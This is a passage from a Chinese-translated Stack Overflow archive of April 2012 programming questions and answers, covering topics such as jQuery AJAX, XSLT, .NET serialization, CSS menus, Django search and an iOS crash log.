        id: '24fe0c97-c227-4312-91fc-6e651df8b64f', 
        cancelReason: 'some reason' 
    },
    success: function (data) {
        alert('success!');
    }
}); 
```

一旦您确保这个简单的示例有效，就可以开始使用变量使其更具动态性。这样，您将能够缩小范围并找到问题的根源。此外，我强烈建议您使用 javascript 调试工具，例如 FireBug。它允许您在控制台中查看您是否有 javascript 错误以及许多其他有用的信息，例如正在发送的确切请求/响应。

如果 AJAX 请求成功，您应该在 FireBug 的“网络”选项卡中看到：

```
Accept:             */*
Accept-Encoding:    gzip, deflate
Accept-Language:    en-us,en;q=0.5
Connection:         keep-alive
Content-Length:     64
Content-Type:       application/x-www-form-urlencoded; charset=UTF-8
User-Agent:         Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0) Gecko/20100101 Firefox/10.0
X-Requested-With:   XMLHttpRequest

id=24fe0c97-c227-4312-91fc-6e651df8b64f&cancelReason=some+reason 
```

请注意如何使用 发送`id`和`cancelReason`参数`application/x-www-form-urlencoded`。

你真的应该学会调试这类问题，调试它们的方法是使用适当的工具。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T21:13:42.587

关于什么

```
 url: '/ZYX/Cancel',
            type: 'POST',
            dataType: 'json',
            data: { Id: Id, cancelReason: reason },
            success: function (data) {
                alert('success!');
            } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-13T21:21:16.417

您需要提供您指定的路线，这可能有助于更好地回答，但是现在应该可以：

```
url: '/ZYX/Cancel?Id=' + Id + '&cancelReason=' + reason, 
```

而且，根本不要传递任何数据。如果这不起作用，那么我将使用 fiddler 或其他网络观察程序插件或调试器来验证原因是有效值。

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-04-13T21:24:30.880

尝试在 Global.asax 文件中设置路由，例如：

```
routes.MapRoute(
            "Cancel", // Route name
            "{controller}/{action}/{id}/{cancelReason}", // URL with parameters
            new { controller = "YourController", action = "Cancel", id = UrlParameter.Optional, cancelReason = UrlParameter.Optional } // Parameter defaults
        ); 
```

# uisplitviewcontroller - 在 splitViewController 的 detailView 中设置 barButtonItem 的标题

> ID：10148373
> 
> 赞同：2
> 
> 时间：2012-04-13T21:11:40.883
> 
> 标签：uisplitviewcontroller, ipad

我是 iOS 的新手，正在努力解决与拆分视图控制器相关的问题。

我有一个拆分视图控制器，其中主控制器是一个导航控制器，包含一个 tabBarController。tabBarController 有两个选项卡，每个选项卡都指向它自己的navigationControllers 中的TableViewControllers。splitView 的详细视图是splitViewDelegate。

我苦苦挣扎的部分是 splitViewController-willHideViewController-withBarButtonItem-forPopoverController。

我想根据母版中显示的标题设置 barButtomItem 的标题。

如果有人能帮助我解决这个问题，我将不胜感激，也许能理解这个过程中缺失的部分。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-14T03:53:04.830

这是使用默认拆分视图控制器项目访问主控标题的代码：

```
UINavigationController *nav  = [[self.splitViewController viewControllers] objectAtIndex:0];
MasterViewController *master = (MasterViewController *)[nav topViewController];
barButtonItem.title          = master.title; 
```

# javascript - 如何获取子div javascript的内容

> ID：10148385
> 
> 赞同：-1
> 
> 时间：2012-04-13T21:12:57.287
> 
> 标签：javascript, html, sql, ajax

我想获取另一个 div 中的 div 的内容并将它们放在一个列表中，然后将其发送到数据库。我围绕 div 循环并获取它的所有内容，但它只返回循环第一项的内容。

div 看起来像这样：

```
 $('#Classes').append('<div> <h1 class = "flip" wpID="' + subjects[i].Wkp_ID+ '</h1><div id ="NewBody" class="panel" contenteditable>' + subjects[i].Wkp_Body + '</div> </div>'); 
```

我使用这些行来获取内容：

```
 $('#Classes div').each(function (index) {
        var header = $(this).children('h1');
        var wpID = header.attr('wpID');
        var WeekBody = document.getElementById("NewBody");
        var Weekbodycontent = WeekBody.innerHTML;

   WeekPlan[index] = {"Wkp_Body": WeekBody};
   }); 
```

那么，您知道如何将所有项目一一添加到列表中吗？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T21:32:41.000

你有几个问题。首先，您的文档中不能有多个对象中存在相同的 ID。你需要改变它。

然后，我会建议这种类型的解决方案在所需的`.panel`div 上使用一个类：

```
$('#Classes').append('<div class="container"><div class="panel" contenteditable>' + 
    subjects[i].Wkp_Body + '</div> </div>');

$('#Classes .container').each(function (index) {
    var header = $(this).children('h1');
    var body = $(this).find(".panel");
    var Weekbodycontent = body.html();
    WeekPlan[index] = {"Wkp_Body": body.get(0)};
}); 
```

# javascript - 我是 javascript 新手，我正在从 url 获取 JSON 数据，我只能在成功函数中访问数据，我错过了什么吗？

> ID：10148388
> 
> 赞同：0
> 
> 时间：2012-04-13T21:13:06.483
> 
> 标签：javascript, ajax, json

这是代码：-

```
var quiz;
function startQuiz() {

     $.ajax({
        url: 'get_quiz/',
        cache: 'false',
        dataType: 'json',
        async: 'false',
        success: function(data) {
            quiz = data;
            alert(quiz[0].q);   // I'm able to access quiz here     

},   
    }    
);  
    }

startQuiz();

alert(quiz[0].q);   // Not able to access it here. 
```

我无法在这里访问测验，我有什么任务吗？，这有什么问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T21:23:04.437

Ajax 是异步的，这可能是一个陌生的概念。您的代码将像这样运行：

```
1\. var quiz;
2\. define function startQuiz;
3\. call startQuiz;
4\. do ajax call (and continue! don't block)
5\. alert(quiz[0].q);    // Not able to access it here.
-- ajax call comes back
6\. quiz = data;
7\. alert(quiz[0].q);       // I'm able to access quiz here 
```

Ajax 是异步的，它不会阻塞。这意味着当您进行 ajax 调用时，回调实际上不会被调用，直到 ajax 调用返回，**它不会阻塞**和等待。相反，代码将继续。

然后稍后当 ajax 调用返回数据时，您的回调函数将被执行。

Javascript 通过事件循环来做到这一点。

像这样看：步骤 1-5 是第一个事件的一部分。6-7 是第二个事件的一部分。

关于 JavaScript 的一个很酷的事情是，在你的回调中，由于作用域，你仍然可以访问它*上面*的任何东西（比如变量）。`quiz`这称为**闭包**。您的回调函数在范围周围关闭，并将其带到下一个事件中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T21:22:37.383

AJAX 调用是异步的，您应该等待结果从服务器返回。要么在回调函数中完成所有工作，要么查看 Promise 库（我喜欢[Q Promise](https://github.com/kriskowal/q)库），这使得等待 AJAX 结果变得非常容易。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-13T21:25:57.353

这是由于 JavaScript 的异步特性，一旦你调用`startQuiz()`它就会执行并跳回并执行你的测验 alert()。

您必须在调用回调后显式访问您的测验数据，以确保您可以访问它。

您还必须担心范围，因为您可能实际上并未修改相同的测验变量。

```
var quiz,
 fetched = false;
$.ajax({
  //blah
 success : function(data){
 fetched = true;
 quiz = data;
}
});

setInterval(function(){
 if(fetched){
 //quiz is populated
  }else{
 //quiz hasn't be populated yet
  }
},50); 
```

虽然不是一个聪明的例子，但我只是想弄清楚`startQuiz()`不等待 ajax 调用的要点。AJAX 中的**A**表示异步。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-13T21:47:58.390

你应该给 jQuery deferreds 一个尝试，这是自 jQuery 1.5 以来编写 ajax 相关代码的首选方式：http: [//javascriptplayground.com/blog/2012/04/jquery-deferreds-tutorial](http://javascriptplayground.com/blog/2012/04/jquery-deferreds-tutorial)

一旦你掌握了它的窍门，可能会更容易编写和理解你的代码。

# asp.net - 在 .net 中为 Web 应用程序制作单例套接字的最佳方法？

> ID：10148389
> 
> 赞同：0
> 
> 时间：2012-04-13T21:13:31.340
> 
> 标签：asp.net, .net, web-applications, singleton

我在 webapp 中用于与服务器上运行的另一个程序通信的套接字行为（未正确关闭或打开）有很多问题。我发现的问题是，套接字要么在同一个请求期间多次打开或关闭，要么即使我终止活动会话也没有结束。

目前我将套接字保存在会话变量中，并检查何时应该创建它或者是否应该引用变量的值，尽管我仍然遇到很多问题。

你有没有遇到过类似的事情，你能和我分享一些你的经历吗？

同样，起初我尝试将其设为静态，尽管我遇到了更多问题。

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-14T17:13:48.890

您将活动打开的套接字放在字典中的缓存或应用程序对象中，或者 asp.net 提供的任何适合您的东西中。在打开新端口之前，您可以通过查看存储在应用程序或缓存中的字典来检查它是否已经打开。连接丢失时从字典中删除条目。

# xslt - XSLT 1 - 查找节点具有不区分大小写值的子节点

> ID：10148390
> 
> 赞同：1
> 
> 时间：2012-04-13T21:13:32.520
> 
> 标签：xslt, xpath, xquery, xslt-1.0, case-insensitive

我有以下选择器，它有效：

```
parent::node()/myNS:expField[myNS:Nam='NAMETOFIND']/myNS:Val 
```

我想要的是对值进行不区分大小写的匹配`myNS:Nam`，因此我可以`<Val>`从以下任何一项中进行选择：

```
<expField>
    <Nam>NAMETOFIND</Nam>
    <Val>the value I want</Val>
</expField>
<expField>
    <Nam>NameToFind</Nam>
    <Val>the value I want</Val>
</expField>
<expField>
    <Nam>nametofind</Nam>
    <Val>the value I want</Val>
</expField>
<expField>
    <Nam>nAmEtOFInD</Nam>
    <Val>the value I want</Val>
</expField> 
```

我正在使用 XSLT 1，所以我不能使用`lower-case()`.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T21:15:58.353

[`translate()`](http://www.w3.org/TR/xpath/#function-translate)会做这项工作，它不漂亮，但它的工作原理。如果您知道要处理的语言，那就是。

# c# - 确定 .NET 类型的序列化大小和非托管内存效率

> ID：10148391
> 
> 赞同：3
> 
> 时间：2012-04-13T21:13:35.280
> 
> 标签：c#, .net, serialization, pointers, unmanaged

我的问题是是否可以确定引用类型的序列化大小（以字节为单位）。

情况如下：

我正在使用 BinaryFormatter 类来序列化基本的 .NET 类型，例如：

```
[Serializable]
public class Foo
{
    public string Foo1 { get; set; }
    public string Foo2 { get; set; } 
} 
```

我将每个项目序列化为一个字节 []，然后将该段添加到现有字节 [] 的末尾，并在每个段的末尾添加一个回车以分隔对象。

为了反序列化，我使用 Marshal.ReadByte() 如下：

```
List<byte> buffer = new List<byte>();

for (int i = 0; i < MapSize; i++)
{
    byte b = Marshal.ReadByte(readPtr , i); 

    if (b != delim)  // read until encounter a carriage return 
        buffer.Add(b);
    else
        break;
}

readPtr = readPtr + buffer.Count + 1; // incrementing the pointer for the next object

return buffer.ToArray(); 
```

我相信使用 Marshal.Copy() 会更有效，但我需要提前知道序列化字节段的长度。有没有一种方法可以可靠地从被序列化的类型中计算出来，或者我可以使用一种更有效的方法？

此外，最终使用回车将不可靠。所以我想知道是否有更标准的方式来分隔对象，或者通过自定义我的 BinaryFormatter 或使用其他一些标准化的最佳实践？例如，如果 BinaryFormatter 的序列化说是通用 List<>，是否有一种特定的方式来分隔对象？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-13T21:22:34.813

使用字节作为二进制序列化数据的分隔符是一个糟糕的主意 - 13 是完全有效的值，可以成为序列化数据的一部分，而不仅仅是您的“分隔符”。

改为以字节大小为每个块添加前缀，并以块为单位读取。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-13T21:32:55.957

没有一种非常好的方法来预先确定序列化长度。BinaryFormatter 协议的规范可在此处获得：http: [//msdn.microsoft.com/en-us/library/cc236844 (v=prot.10).aspx](http://msdn.microsoft.com/en-us/library/cc236844(v=prot.10).aspx)

为了您的目的，我将为您省去阅读它的麻烦：

1.  它被构建为可扩展的格式。这允许您稍后添加字段，并且仍然保持与早期实现的一些兼容性。出于您的目的，这意味着序列化表单的长度不是及时固定的。
2.  它非常脆弱。二进制格式实际上对其中的字段名称进行了编码。如果你曾经重命名一个字段，序列化表单的长度将会改变。
3.  二进制格式实际上包含序列化编码和对象数据之间的多对一关系。同一个对象可能以多种不同的方式编码，输出的字节数不同（我不会解释为什么要这样写）。

如果您想要一种简单的方法来做事，只需创建一个包含所有对象的数组并序列化该单个数组。这解决了你的大部分问题。分隔不同对象的所有问题都由 BinaryFormatter 处理。您不会有过多的内存复制。最终输出将更加紧凑，因为 BinaryFormatter 每次调用只需指定一次字段名称。

最后，我可以告诉您，额外的内存副本不是您当前实现效率低下的主要原因。BinaryFormatter 对反射的使用以及它对序列化输出中的字段名称进行编码的事实使您的效率低得多。

如果效率是最重要的，那么我建议编写一些自定义代码，以“普通旧数据”格式对结构的内容进行编码。然后，您将可以控制写入的数量和方式。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-13T21:23:37.290

您可以使用 Marshal.SizeOf 来获取结构的本机大小。这仅适用于结构，我建议您设置 StructLayout 属性。

我将从评论中提取一些信息，因为它令人惊讶但很重要：

CLR 具有用于固定结构或类的本机布局的元数据工具。在 C# 中，这仅适用于结构。但是类也可以这样使用。

如果您指定 SequentialLayout，您可以将托管类型位位元组化为字节。[http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.structlayoutattribute.aspx](http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.structlayoutattribute.aspx)这个工具并不为人所知，但它存在，被指定和支持。**引用：“类布局属性（AutoLayout、SequentialLayout 和 ExplicitLayout）定义了类实例的字段在内存**中的布局方式。”

查看 System.Reflection.TypeAttributes 枚举。它还定义了其他 CLR 级别的属性。C# 不授予对它们的访问权限，但 ilasm.exe 可以。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2018-06-27T16:14:00.607

[我可以使用https://bytes.com/topic/c-sharp/answers/238927-object-size-memory](https://bytes.com/topic/c-sharp/answers/238927-object-size-memory)中的此代码找到根本不序列化的原因

```
var m = new System.IO.MemoryStream();
var b = new
System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
b.Serialize(m, Obj);
var size = Convert.ToDouble(m.Length); 
```

# asp.net-mvc - ASP.NET MVC 控制器操作授权

> ID：10148399
> 
> 赞同：0
> 
> 时间：2012-04-13T21:13:55.123
> 
> 标签：asp.net-mvc, authorization

刚开始使用 ASP.NET MVC。我正在为我们的 (FogBugz) 帮助台系统开发一个客户门户。我知道用 [Authorize] 装饰我的 ActionResults 需要用户登录，但我不确定如何最好地确保用户只能访问他们自己的调用。

一旦用户被授权，我可以从 User 对象中获取他们的用户名，那么我应该将其从我的控制器传递到业务层并在那里进行授权，还是有更好的方法来做到这一点（比如自定义 AuthorizeAttribute）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T21:43:09.387

我认为你应该阅读下面的这篇文章。它可能会帮助您找到正确的方法。

[里克安德森@MSDN 博客。](http://blogs.msdn.com/b/rickandy/archive/2012/03/23/securing-your-asp-net-mvc-4-app-and-the-new-allowanonymous-attribute.aspx) 或 [如何创建特定于区域、控制器或操作的自定义 AuthorizeAttribute？](https://stackoverflow.com/questions/4889541/how-do-i-create-a-custom-authorizeattribute-that-is-specific-to-the-area-contro/4890406#4890406)

# html - 如何使用 CSS 导航创建子菜单？

> ID：10148400
> 
> 赞同：0
> 
> 时间：2012-04-13T21:13:56.110
> 
> 标签：html, css, navigation

我想创建一个 CSS 导航，其中包含单击标题选项卡时出现的子菜单。这是我希望看到它如何工作的示例 HTML：

```
<ul id="menu">
<li id="nav-1"><a href="home.php">Home</a></li>
<li id="nav-2"><a href="#">Menu 1</a>
<ul id="subnav-2">
  <li><a href="page1">Page 1</a></li>
  <li><a href="page2">Page 2</a></li>
  <li><a href="page3">Page 3</a></li>
</ul>
</li>
<li id="nav-3"><a href="#">Menu 2</a>
<ul id="subnav-3">
  <li><a href="page1">page 1</a></li>
  <li><a href="page2">page 2</a></li>
  <li><a href="page3">page 3</a></li>
</ul>
</li>
  <li id="nav-4"><a href="crickets.php">Other tab without submenu</a>
  </li>
</ul> 
```

我似乎无法在网上找到任何东西来完成这项工作。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-02-03T09:20:37.607

The [Swimbi app](http://swimbi.com/) generates rather clean CSS code of drop down menu. You can use the app or just copy the CSS from the demo page [http://f-source.com/swimbi/demo/?menu=Apple_Blue%20Sea](http://f-source.com/swimbi/demo/?menu=Apple_Blue%20Sea)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T21:27:46.867

如果您不介意使用库，我建议您使用[bootstrap](http://twitter.github.com/bootstrap/)。它使创建带有下拉子菜单的菜单变得非常容易，并且它具有非常简洁的默认样式。你应该看看这个：

[http://twitter.github.com/bootstrap/javascript.html#dropdowns](http://twitter.github.com/bootstrap/javascript.html#dropdowns)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-13T21:29:41.577

**编辑**：哎呀！你说的是“点击”，而不是“悬停”。对不起。我会把它留在这里，以防它帮助别人。

* * *

我在这里有一个来自语义标记的纯 CSS 分层菜单的四种技术示例：http:
[//phrogz.net/JS/ul2menu/purecss_testsuite.html](http://phrogz.net/JS/ul2menu/purecss_testsuite.html)

这是一个单一技术的例子：http:
[//jsfiddle.net/FX4Dz/1/](http://jsfiddle.net/FX4Dz/1/)

```
<nav><ul>
  <li>Header 1<ul>
    <li class="sub">Subhead 1.1<ul>
      <li>Subhead 1.1.1</li>
      <li>Subhead 1.1.2</li>
    </ul></li>
    <li>Subhead 1.2</li>
    <li>Subhead 1.3</li>
  </ul></li>
  <li>Header 2<ul>
    <li>Subhead 2.1</li>
    <li class="sub">Subhead 2.2<ul>
      <li>Subhead 2.2.1</li>
    </ul></li>
  </ul></li>
</ul></nav>​ 
```

```
nav li       {
    display:inline-block;
    padding:0 0.4em;
    height:1.4em; line-height:1.4em;
    position:relative;
}

nav li ul         { display:none }
nav li li         { display:block; width:8em }
nav li:hover > ul {
  display:block;
  position:absolute;
  top:1.4em; left:-1px; /* align with respect to horizontal row */
  width:8em; z-index:2
}
nav li li:hover ul {
  left:8em; top:-1px    /* subnav menus align next to their menu item */
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-13T21:29:50.483

如果您需要在点击时执行此操作，则需要 javascript。如果您可以在悬停时执行此操作，则可以执行以下操作：

```
#menu ul{
 dispaly: none;
}

#menu > li:hover ul{
 display: block;
} 
```

警告：这只适用于 IE7+。您还需要适当地定位下拉菜单（绝对定位，最有可能）。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-13T21:29:58.680

[http://css3menu.com/](http://css3menu.com/) 下载这个并自己制作一个，然后浏览代码，编辑和学习

# javascript - 浮动元素和使用 jQuery

> ID：10148403
> 
> 赞同：0
> 
> 时间：2012-04-13T21:14:00.983
> 
> 标签：javascript, jquery, css

我有一个徽标网格，5 个横，4 个向下。

当用户单击任何徽标时，该徽标将被推入网格并退出站点。在点击第 5 个徽标之前，一切都运行得非常顺利。你可以在这里试试：

[徽标隐藏器](http://warcadia.com/site/inxex.html)

当您单击第 5 个时，有关如何纠正徽标中的跳跃的任何想法？

这是我的 jQuery：

```
 $(document).ready(function() {

$('.imageShowing').click(function() {

        if ($(':animated').length) {
        return false;
                    }
  $(this).animate({
    zIndex: '1',
    height: '100',
    width: '140',
    marginTop: '14px',
    marginLeft: '20px',
    marginRight: '20px',
    marginBottom: '14px',
  }, 100, function() {

    $(this).rotate({ angle:0,animateTo:90,easing: $.easing.easeInOutExpo })

    $(this).animate({
    zIndex: '1',
    top: '480',
    opacity: '0'
  }, 1000, function() {  
  $(this).hide("fast");  
    // Animation complete.
  });
  });
});

}); //end document.ready 
```

我的 CSS：

```
#wrapper { width: 1000px; margin: 0 auto; height: 1000px; position: relative;}
#grid {width: 935px; height: 531px; margin: 0 auto; background: url(images/grid.png) no-repeat center; padding:39px 4px 39px 11px; position: relative; z-index: 5;}
#logoWrapper {position: absolute; top: 38px; left: 36px }
#logoWrapper img { float: left; padding: 0 7px 6px 0; margin:0; position: relative; z-index: 6;}

#bottom { height: 500px; width: 950px; background: #fff; margin: 0 auto; position: relative; z-index: 10;} 
```

HTML 非常简单。谢谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T21:18:07.993

我建议将其设为无序列表，既因为它会使您想做的事情更容易，也出于语义目的。

然后，您可以`<li>`相对定位您的 s 和其中的图像绝对。这样动画图像不会破坏网格的布局。只需隐藏`<li>`最后而不是图像。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T21:23:20.830

在我的 chrome 中一切正常，但在 IE 7 中，在你的第一个动画中根本不工作

```
$(this).animate({
    zIndex: '1',
    height: '100',
    width: '140',
    marginTop: '14px',
    marginLeft: '20px',
    marginRight: '20px',
    marginBottom: '14px',
  } 
```

删除marginBottom 后面的最后一个','，某些浏览器可能需要另一个参数。

# python - 在每一页上搜索输入。姜戈

> ID：10148407
> 
> 赞同：1
> 
> 时间：2012-04-13T21:14:39.643
> 
> 标签：python, django, search

我在 Django 上有一个网站。我想在每个页面上创建一个搜索输入。在一些“base.html”中，我为此搜索输入编写了新内容。

在views.py中我添加了一些类似的东西：

```
def main(request):
    if request.method == 'POST':
        search_string = request.POST['search_string']
        result = search(search_string)
        return direct_to_template(request, 'found_page.html', {'result': result})` 
```

但我希望它在每一页上。

因此，我创建了新函数“search_function(request)”并将其添加到 views.py 中的每个 def 中。或者我可以创建一个装饰器并在views.py 中的每个def 之前编写它。

我不想每次添加新的def时都这样做。但我不知道怎么做。需要你的帮助

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-13T21:26:35.760

所以这就是我认为你想要做的：在每个页面上显示一个搜索输入表单（无论哪个适用），并且只使用一个视图来处理搜索。

1.  创建一个处理搜索的视图
2.  创建一个 html 页面，其中包含`<form>`搜索元素，其操作将转到您在上一步中完成的视图
3.  在您的 base.html 中包含或扩展它

我不明白的是，您是否需要搜索恰好是本地页面上的搜索？（例如，在本论坛内搜索）

要获取查询，您可以通过或类似方式提供`request.GET['q']`查询`request.POST['q']`。

```
def search(request):
  if 'q' in request.GET and request.GET['q']:
     // do something 
```

除非您的搜索（查询）更改了数据库中查询结果的状态，否则您不想使用`POST`. 改为使用`GET`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T21:20:59.303

将表单的操作设置为转到不同的搜索视图，并让该功能负责搜索处理。您可以有一个专门的搜索页面，并执行完全相同的操作来检查表单是“POST”还是“GET”。“POST”是已经从任何其他先前页面完成的搜索。

# google-chrome-extension - setInterval 使用前一个值？

> ID：10148410
> 
> 赞同：3
> 
> 时间：2012-04-13T21:14:50.470
> 
> 标签：google-chrome-extension, message, local-storage, setinterval

我正在开发 Google Chrome 扩展程序，但遇到了一个相当奇怪的问题。（我会尽量保持简单）

基本上，我允许用户自定义`setInterval`循环的间隔速度。我使用输入框执行此操作，当输入数据时，该输入框`localStorage`在`keyUp`. 然后该`localStorage`值通过 Chrome 的消息传递 API 传递给内容脚本，`setInterval`循环自动获取它。

**选项.html**

```
<!DOCTYPE html>
    <head>
    </head>

    <body>
        <input type="text" id="customTime_Input" onKeyUp="setPref_customTime()" />

        <!--Call JavaScript functions after all elements are created-->
        <script type="text/javascript" src="messagePassing.js"></script>
        <script type="text/javascript" src="options.js"></script>
    </body>
</html> 
```

**背景.html**

```
<!DOCTYPE html>
    <head>
        <script type="text/javascript" src="messagePassing.js"></script>
        <script type="text/javascript" src="content.js"></script>
    </head>

    <body>
    </body>
</html> 
```

**消息传递.js**

```
if(localStorage["scanTime"] == undefined || localStorage["scanTime"] == ""){
   localStorage["scanTime"] = 2000;
}

chrome.extension.onRequest.addListener(
    function(request, sender, sendResponse) {
        if (request.method == "getScanTime"){
            sendResponse({data: localStorage["scanTime"]});
            console.log("scanTime LS, response: " + localStorage["scanTime"]);
        }
    }
); 
```

**选项.js**

```
function setPref_customTime(){
   var inputBoxElement = document.getElementById("customTime_Input");

   localStorage["scanTime"] = inputBoxElement.value;
   console.log("scanTime LS, setPref_customTime(): " + localStorage["scanTime"]);
} 
```

**内容.js**

```
window.load = passMessages();
function passMessages(){
    chrome.extension.sendRequest({method: "getScanTime"}, function(response) {
        localStorage["scanTime"] = response.data;
        console.log("scanTime LS, request: " + localStorage["scanTime"]);
    });

    scanPage();
}

function scanPage(){
    console.log("scanTime LS, scanPage: " + localStorage["scanTime"]);

    setInterval(function match(){
        console.log("scanTime LS, match: " + localStorage["scanTime"]);
    }, localStorage["scanTime"]);
} 
```

并且控制台在输入自定义值后返回这些日志（当加载默认值时，它会为所有日志返回“2000”，就像它应该的那样）：

```
scanTime LS, scanPage: 2000
scanTime LS, scanPage: 2000
scanTime LS, request: 5000
scanTime LS, request: 5000
scanTime LS, scanPage: 2000
scanTime LS, request: 5000
scanTime LS, match: 5000
scanTime LS, match: 5000
scanTime LS, match: 5000
scanTime LS, match: 5000
[etc] 
```

它清楚地表明`setInterval`正在使用新值，但页面和日志以旧值的速度刷新（这不是用户错误。我多次使用了截然不同的值并且得到了相同的结果）。`localStorage`同名的 a 怎么能相隔几行有不同的值？

**更新**：我刚刚注意到控制台报告了`console.log()`除“scanTime LS, response:”之外的所有命令。这很重要吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T21:48:15.733

您看到的问题是您有一个以 2000 毫秒运行的循环，然后以 5000 毫秒开始一个新的循环，让您同时运行两个循环。[当您使用clearInterval](https://developer.mozilla.org/en/DOM/window.clearInterval)开始第二个时，您需要取消第一个。

像这样的东西应该工作。

```
function scanPage(){
    console.log("scanTime LS, scanPage: " + localStorage["scanTime"]);

    if (localStorage["intervalID"]) {
      clearInterval(localStorage["intervalID"]);
    }

    localStorage["intervalID"] = setInterval(function match(){
        console.log("scanTime LS, match: " + localStorage["scanTime"]);
    }, localStorage["scanTime"]);
} 
```

# xcode4.3 - XCode 4.3 ad hoc 使 iPad 崩溃 - 在模拟器中运行，如果从 Xcode 加载，则在 iPad 上运行

> ID：10148416
> 
> 赞同：2
> 
> 时间：2012-04-13T21:15:41.453
> 
> 标签：xcode4.3, ipad-2, adhoc, route-me

我在 Xcode 4.3.1 中工作，并为 iOS 5.1 开发。我的应用在模拟器中运行良好；如果我从 Xcode 安装它，它在我的 iPad 上运行良好。但是当我从临时存档安装它时，当我尝试打开特定的视图控制器时它会崩溃。我有两种方法可以进入这个视图——一种是通过标签栏，另一种是通过某些页面上的按钮。视图控制器正在打开一个地图视图，但这在过去运行良好。我对我的地图源进行了更改（之前是打开在线源，现在是打开本地源），但是在调用此代码之前似乎发生了崩溃，所以我认为更改不是问题. 我已经尝试了我可以在堆栈溢出和其他地方找到的所有建议——主要与构建设置或方案有关——但没有任何运气。

如果这是一个代码问题，那么它在我正在调用的不同库中（一个 route-me 库） - 但根据崩溃日志，我什至认为我没有走那么远，它似乎是一个框架问题。

但如果它不是框架.....我已将 MapView 集成到我的项目中，并且基于 Analyzer，这是我认为应该根据我在这里看到的其他问题和答案更改的代码：

```
- (id)initWithView: (UIView*) view
{   
    LogMethod();
    CLLocationCoordinate2D here;
    here.latitude = kDefaultInitialLatitude;
    here.longitude = kDefaultInitialLongitude;

    return [self initWithView:view
                   tilesource:[[RMOpenStreetMapSource alloc] init]
                 centerLatLon:here
                    zoomLevel:kDefaultInitialZoomLevel
                 maxZoomLevel:kDefaultMaximumZoomLevel
                 minZoomLevel:kDefaultMinimumZoomLevel
              backgroundImage:nil
                  screenScale:0];      
} 
```

我想我需要重写以“return”开头的那一行，但我不知道如何让它正确。我发现的样本比上面的要简单得多。Xcode 分析器告诉我：

1.  方法返回具有 +1 保留计数的 Objective-C 对象
2.  对象泄漏：分配的对象在此执行路径中稍后未引用，并且保留计数为 +1

我是一位经验丰富的 Windows 程序员 - 但我是 Apple 和 Xcode 的新手。

这是符号化的崩溃报告：

> 基础地址0入射标识符：1805810C-950E-41CE-9773-97C1798A3007 CRASHREPORTER键：
> 13EE73ABE8E268A2AB7A84B973BC08DF600DD98B硬件型号：IPAD2,1工艺：瓦格纳[963]路径：
> / var /移动/应用/ AF402A1F-F483-4517-9482-177C928D3859 / Waggoner.app/Waggoner 标识符：Wagoner 版本：??? (???) 代码类型：
> ARM（本机）父进程：launchd [1]
> 
> 日期/时间：2012-04-12 21:08:25.611 -0700 操作系统版本：iPhone OS 5.1 (9B176) 报告版本：104
> 
> 异常类型：EXC_CRASH (SIGABRT) 异常代码：0x00000000、0x00000000 线程崩溃：0
> 
> 上次异常回溯：0的CoreFoundation
> 0x33e5088f **exceptionPreprocess + 163 1 libobjc.A.dylib
> 0x32942259 objc_exception_throw + 33 2的CoreFoundation
> 0x33e5392f + [NSObject的doesNotRecognizeSelector：] + 175 3
> 的CoreFoundation 0x33e52915 __*转发***+ 301 4
> 的CoreFoundation 0x33dad650 _CF_forwarding_prep_0 + 48 5瓦格纳0x0003d0a5 0x26000 + 94373 6 wagoner 0x0006241f 0x26000 + 246815 7
> wagoner 0x0005aeb3 0x26000 + 216755 8
> wagoner 0x0005bca5 0x26000 + 220325 9
> wagoner 0x0005c3cd 0x26000 + 222157 10
> wagoner 0x0005c055 0x26000 + 221269 11瓦格纳
> 0x00061693 0x26000 + 243347 12瓦格纳
> 0x000600c5 0x26000 + 237765 13瓦格纳
> 0x0002827f 0x26000 + 8831 14的UIKit
> 0x35aa6e33 - [UIViewController的视图] + 167 15的UIKit
> 0x35b067e5 - [的UITabBarController transitionFromViewController：toViewController：过渡：shouldSetSelected：] + 93 16的UIKit 0x35b06783 - [的UITabBarController transitionFromViewController :toViewController:] + 31 17 UIKit 0x35b060bd -[UITabBarController _setSelectedViewController:] + 301 18 UIKit 0x35b05df1 -[UITabBarController setSelectedIndex:] + 241 19 Wagoner 0x00036a53 0x26000 + 68179 20 CoreFoundation
> 0x33daa3fd -[NSObject performSelector:withObject:withObject:] + 53 21 UIKit 0x35a88faf -[UIApplication sendAction:to:from:forEvent:] + 63 22 UIKit
> 0x35a88f6b -[UIApplication sendAction:toTarget:fromSender:forEvent:] + 31 23 UIKit 0x35a88f49 -[UIControl sendAction:to:forEvent:] + 45 24 UIKit
